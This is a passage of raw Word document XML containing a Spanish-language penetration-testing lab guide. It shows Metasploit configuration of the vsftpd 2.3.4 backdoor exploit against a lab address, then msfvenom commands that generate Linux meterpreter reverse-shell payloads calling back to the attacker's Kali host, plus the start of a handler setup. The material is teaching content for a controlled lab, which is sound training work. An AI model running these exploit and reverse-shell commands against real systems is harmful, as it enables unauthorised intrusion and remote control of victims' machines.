        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="71E09D03" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Busca un </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>exploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> (ejemplo genérico):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F46058" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>search</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>vsftpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4A20EB4E" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Si usas uno encontrado (ej. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>exploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>unix</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/ftp/vsftpd_234_backdoor), configúralo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BEFF948" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:r w:rsidRPr="00E149BA">
        <w:t>use exploit/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>unix</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>/ftp/vsftpd_234_backdoor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703B3936" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:r w:rsidRPr="00E149BA">
        <w:t>set RHOST 192.168.56.102</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0EC8C6" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:r w:rsidRPr="00E149BA">
        <w:t>set RPORT 21</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71392D04" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:r w:rsidRPr="00E149BA">
        <w:t xml:space="preserve">set PAYLOAD </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>unix</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t xml:space="preserve">/interact   # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>ejemplo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>según</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t xml:space="preserve"> exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3980F188" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22BECAA5" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Resultado esperado: si la VM es vulnerable, conseguirás una </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>shell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> o interacción.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Corrección importante:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> los </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>exploits</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> reales requieren </w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>que el servicio y la versión sean exactamente vulnerables</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">. Si no funciona, es normal: revisa versión/servicio, puertos, cortafuegos y compatibilidad del </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C70E66C" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00000000" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:pict w14:anchorId="3AD6BF8F">
          <v:rect id="_x0000_i1028" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="624485D7" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Ejercicio C — Reverse </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>shell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> con </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>handler</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> (muy directo)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C1DECE6" w14:textId="77777777" w:rsidR="00195A5B" w:rsidRPr="00195A5B" w:rsidRDefault="00195A5B" w:rsidP="00195A5B">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Objetivo (en palabras sencillas)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33160B72" w14:textId="77777777" w:rsidR="00195A5B" w:rsidRPr="00195A5B" w:rsidRDefault="00195A5B" w:rsidP="00195A5B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Crear un programa malévolo controlado (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">) que, al ejecutarse en la máquina víctima, abra una conexión de vuelta hacia tu Kali. En Kali levantamos un </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>handler</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> (escuchador) que </w:t>
      </w:r>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">acepta esa conexión y nos da una </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">/reverse </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>shell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> para interactuar con la máquina víctima. Todo en un entorno controlado — </w:t>
      </w:r>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>nunca</w:t>
      </w:r>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> fuera del laboratorio.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC1F0B9" w14:textId="77777777" w:rsidR="00195A5B" w:rsidRPr="00195A5B" w:rsidRDefault="00000000" w:rsidP="00195A5B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:pict w14:anchorId="36934DD6">
          <v:rect id="_x0000_i1029" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3CE104" w14:textId="77777777" w:rsidR="00195A5B" w:rsidRPr="00195A5B" w:rsidRDefault="00195A5B" w:rsidP="00195A5B">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Conceptos clave (rápido)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00914161" w14:textId="77777777" w:rsidR="00195A5B" w:rsidRPr="00195A5B" w:rsidRDefault="00195A5B" w:rsidP="00195A5B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>: el programa que se ejecuta en la víctima y abre la conexión de vuelta.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F85E181" w14:textId="77777777" w:rsidR="00195A5B" w:rsidRPr="00195A5B" w:rsidRDefault="00195A5B" w:rsidP="00195A5B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Handler</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">: el servicio en Kali que escucha la conexión entrante del </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E2905B4" w14:textId="77777777" w:rsidR="00195A5B" w:rsidRPr="00195A5B" w:rsidRDefault="00195A5B" w:rsidP="00195A5B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>LHOST</w:t>
      </w:r>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>: IP de tu Kali (la que la víctima puede alcanzar).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76CCA8A6" w14:textId="77777777" w:rsidR="00195A5B" w:rsidRPr="00195A5B" w:rsidRDefault="00195A5B" w:rsidP="00195A5B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>LPORT</w:t>
      </w:r>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>: puerto por el que se establecerá la conexión.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246ED57A" w14:textId="77777777" w:rsidR="00195A5B" w:rsidRPr="00195A5B" w:rsidRDefault="00195A5B" w:rsidP="00195A5B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">: un tipo de </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>shell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> potente que ofrece </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> (más útil que una </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>shell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> simple).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0075D2" w14:textId="77777777" w:rsidR="00195A5B" w:rsidRPr="00195A5B" w:rsidRDefault="00195A5B" w:rsidP="00195A5B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Arquitectura</w:t>
      </w:r>
      <w:r w:rsidRPr="00195A5B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>: 32-bit (x86) o 64-bit (x64). Debe coincidir con la víctima</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24220EF1" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">En Kali — paso 1: generar </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> (elige arquitectura correcta)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t>Para Linux x86 (32-bit):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A3F869" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t xml:space="preserve"> -p </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>/x86/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t xml:space="preserve"> LHOST=192.168.56.1 LPORT=4444 -f elf -o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>shell.elf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="327DAB36" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:r w:rsidRPr="00E149BA">
        <w:t>Para Linux x86_64 (64-bit):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A1E1302" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t xml:space="preserve"> -p </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>/x64/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t xml:space="preserve"> LHOST=192.168.56.1 LPORT=4444 -f elf -o shell64.elf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECBE5C8" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Paso 2: prepara el </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>handler</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> en </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3F3AEA05" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="52309CC7" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
